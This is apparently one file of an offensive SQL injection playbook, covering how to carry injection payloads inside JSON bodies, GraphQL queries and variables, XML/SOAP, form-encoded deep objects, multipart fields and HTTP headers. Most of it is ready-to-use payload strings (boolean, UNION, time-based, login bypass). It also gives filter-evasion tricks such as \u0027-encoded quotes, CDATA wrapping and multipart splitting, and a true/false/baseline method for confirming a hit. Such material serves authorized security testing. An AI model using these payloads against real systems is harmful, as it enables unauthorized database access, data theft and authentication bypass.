# JSON bodies & GraphQL — injection through structured params

Same SQL grammar, different envelope. The payload content is the
SQL you already know; this file is how to CARRY it inside JSON /
GraphQL / nested-object params — the escaping rules, the nesting
shapes, and where the injectable value actually lives.

---

## 1. `application/json` — the param is a JSON string value

```json
POST /api/item
{"id":"1"}
```

Inject into the string value:

```json
{"id":"1' AND '1'='1-- -"}
{"id":"1' AND '1'='2-- -"}
{"id":"1' UNION SELECT NULL,version(),NULL-- -"}
{"id":"1' AND SLEEP(3)-- -"}
{"id":"admin'-- -"}
```

The escaping rules — `'` is legal inside a JSON string, `\` and `"`
are the escapes:

```json
{"id":"1\" AND \"1\"=\"1-- -"}        -- escaped " for " context
{"id":"1' AND \"x\"=\"x-- -"}          -- mixed quoting
{"id":"1\\' OR 1=1-- -"}               -- backslash-escaped quote
{"id":"1\u0027 AND \u00271\u0027=\u00271-- -"}    -- \u-encoded quote
{"id":"1\u0022 AND \u00221\u0022=\u00221-- -"}
{"id":"1' OR (SELECT 'a')='a-- -"}
{"id":"x'||(SELECT 'a')||'"}
```

`\u0027` is the important one — some WAFs/JSON parsers decode `\u`
AFTER their filter pass, so the quote lands live server-side.

---

## 2. Nested JSON objects — find the leaf

```json
{"user":{"id":"1"}}
{"filter":{"name":"x","id":"1' AND '1'='1-- -"}}
{"sort":{"field":"id","dir":"desc"}}
{"q":{"$eq":"1","$gt":""}}
{"where":{"and":[{"id":"1'"},{"id":"2"}]}}
{"ids":["1","2' AND 1=1-- -","3"]}
{"ids[]":"1' AND '1'='1-- -"}             -- PHP-style array key
{"items":[{"id":"1'"},{"id":"2'"}]}
{"data":{"attributes":{"id":"1'"}}}
{"filter[where][id]":"1' AND '1'='1-- -"}  -- loopback bracket keys
```

Each leaf is a param — probe the leaves the app actually reads.
The `sort`/`field`/`dir` leaf on a listing endpoint is the
ordering-param home — `edge-contexts.md` §4.

---

## 3. Non-string JSON values — number/array/bool

```json
{"id":1}                  → injectable if the app interpolates into SQL
{"id":"1"}                → string-wrapped version — both probe
{"id":[1]}                → array wrap — some apps implode()
{"id":{"$gt":0}}          → operator-object (NoSQL territory)
{"id":null}               → null payload probe
{"id":true}               → bool — "WHERE id=TRUE" vs "WHERE id=1"
```

When the app does `WHERE id=${id}` with a JSON number — inject
the number as a STRING but the value lands unquoted:

```json
{"id":"1 AND 1=1"}
{"id":"1 UNION SELECT NULL-- -"}
{"id":"1) UNION SELECT NULL-- -"}
{"id":"(SELECT 1 FROM secrets)"}
```

If the app serialises the number (`String(id)`), the string form
still lands unquoted — that's the same numeric-context injection.

---

## 4. GraphQL — query strings, variables, fragments

```graphql
{ user(id:"1") { name } }
{ user(id:"1' AND '1'='1-- -") { name } }
{ user(id:"1' UNION SELECT NULL,username-- -") { name } }
query { search(q:"a%' UNION SELECT NULL-- -") { name } }
query ($id:ID!){ node(id:$id){__typename} }
   variables: {"id":"1' AND '1'='1-- -"}
query ($id:String){ node(id:$id){__typename} }
   variables: {"id":"1' UNION SELECT NULL-- -"}
```

Same escaping rules as JSON — `\u0027` inside variables, `\"`
inside the query string. GraphQL quirks:

- `__typename` is free — always resolves, use it as the
  boolean oracle when data differs.
- Introspection `__schema { types { name } }` — the schema is
  usually queryable even on WAFed deployments (it doesn't look
  like a payload).
- Aliases multiply the query: `{ a:user(id:"x'"){name}
  b:user(id:"y'"){name} }` — two probes per request.
- Fragments let you inject through `... on` type conditions.
- `variables` are JSON — same escape rules as §1-§3.
- Errors echo the resolved-field name — free context disclosure.

---

## 5. XML/SOAP bodies

```xml
<user><id>1' AND '1'='1-- -</id></user>
<soap:Envelope><soap:Body><q><id>1' OR '1'='1</id></q></soap:Body>
</soap:Envelope>
<item><id><![CDATA[1' AND '1'='1-- -]]></id></item>
<filter><id>1&lt;!--'--&gt;</id></filter>
```

`<![CDATA[...]]>` carries raw bytes without entity-escaping — the
payload lands verbatim. XXE is a different class (web-xxe) — this
is just the SQLi-in-XML transport.

---

## 6. Form-encoded deep objects (PHP/Rails-style)

```text
POST body:  filter[where][id]=1' AND '1'='1-- -
            filter[or][0]=x&filter[or][1]=y' OR '1'='1
            ids[]=1&ids[]=2' AND 1=1-- -
            user[name]=x' OR '1'='1
            sort[field]=id&sort[dir]=desc,if(1=1,id,name)
```

The bracket-key form (`filter[x]`) maps to a nested object — the
value at the leaf is still injectable.

---

## 7. Multipart/form-data

```text
------boundary
Content-Disposition: form-data; name="id"

1' AND '1'='1-- -
------boundary
Content-Disposition: form-data; name="id"; filename="x.txt"
Content-Type: text/plain

1' UNION SELECT NULL-- -
------boundary--
```

The `filename=` field often lands in SQL (upload metadata) — second
order often (`second-order.md`). The boundary-split transport dodges
some WAF parsers (`waf-evasion.md` §5).

---

## 8. Header payloads — when the value IS the param

```text
X-Forwarded-For: 127.0.0.1' AND '1'='1-- -
X-Real-IP: 1' UNION SELECT NULL-- -
User-Agent: x' OR '1'='1-- -
Referer: https://x' AND SLEEP(3)-- -
Cookie: session=abc' UNION SELECT NULL-- -
Cookie: prefs=id' AND 1=1-- -
Authorization: Bearer x' UNION SELECT NULL-- -
X-Api-Key: key' OR '1'='1-- -
Accept-Language: en' AND '1'='1-- -
X-Custom-Header: anything the app echoes/queries
```

`tools/web/http_probe.py --header 'X-Forwarded-For: ...'` is the
evidence-grade single request.

---

## 9. The read-back problem — JSON renders your string verbatim

When the app reflects `{"id":"<your payload>"}` back, the reflected
string includes your escaping — `{"id":"1' AND ..."}` echoes with
the quote. Baseline-diff still applies (true/false pairs differ),
but the verbatim echo is not a finding by itself — the response
must differ BETWEEN the true and false forms, not just echo.

```text
{"id":"1' AND '1'='1-- -"} → {"id":"x","name":"alice"}    true-row
{"id":"1' AND '1'='2-- -"} → {"id":"x","name":null}       false-row
{"id":"1"}                 → {"id":"x","name":"alice"}    baseline
```

Three rows, not two — always compare against baseline AND false.

---

## 10. Escape-order summary — which layers eat which chars

| Layer | Eats | Survives |
|---|---|---|
| JSON string | `"` `\` | `'` raw, `\u0027`, `\\'` (→`\'` or `'`) |
| JSON `\u` | none | `\u0027` decodes to `'` server-side |
| CDATA | none | every byte verbatim |
| URL-encoded | `%` `+` | `%27`, `%2527` (double) |
| header | none | `'` raw always |
| multipart | boundary only | `'` raw in field bodies |
| GraphQL var | `"` `\` | same as JSON |
| GraphQL query | `"` `\` | `\"` for inner quotes, `\u0027` |

---

## 11. The full mapping — param → query position

```text
{"id":"X"}            → WHERE id='X'
{"ids":[X]}           → WHERE id IN (X)      or implode(',')
{"sort":"X"}          → ORDER BY X           (edge-contexts §4)
{"filter[f][id]":"X"} → WHERE id='X'         (loopback)
{"q":"X"}             → WHERE name LIKE '%X%'
{"user":{"name":"X"}} → WHERE name='X'
{"token":"X"}         → WHERE token='X'      (reset auth-bypass §7)
{"search":{"$eq":"X"}}→ operator injection   (web-nosqli, not here)
```

When the field reads as an object (`{"id":{"$gt":""}}`), route to
`web-nosqli` — that's a different class. This file is for when the
value stays a STRING inside JSON but lands in SQL.
